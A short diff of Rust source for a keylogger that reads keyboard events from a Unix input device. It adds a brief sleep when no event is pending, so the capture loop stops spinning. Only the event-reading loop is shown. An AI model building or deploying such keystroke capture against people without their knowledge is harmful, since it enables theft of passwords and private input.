@@ -8,7 +8,8 @@ use std::fs::{self, read_dir, File, OpenOptions};
 use std::io::{self, Read, Write};
 use std::os::unix::fs::{FileTypeExt, OpenOptionsExt};
 use std::path::Path;
-use std::process;
+use std::time::Duration;
+use std::{process, thread};
 use std::sync::{Arc, Mutex};
 
 const MAX_CHUNK_SIZE: usize = 1024 * 10;
@@ -90,6 +91,11 @@ pub fn run_keylogger(args: StartKeyLoggerArguments) -> Result<(), Box<dyn std::e
     })?;
 
     loop {
+        if !device.has_event_pending() {
+            thread::sleep(Duration::from_millis(1));
+            continue;
+        }
+
         if let Ok(ev) = device.next_event(ReadFlag::NORMAL).map(|val| val.1) {
             if ev.event_type() != Some(EventType::EV_KEY) {
                 continue;
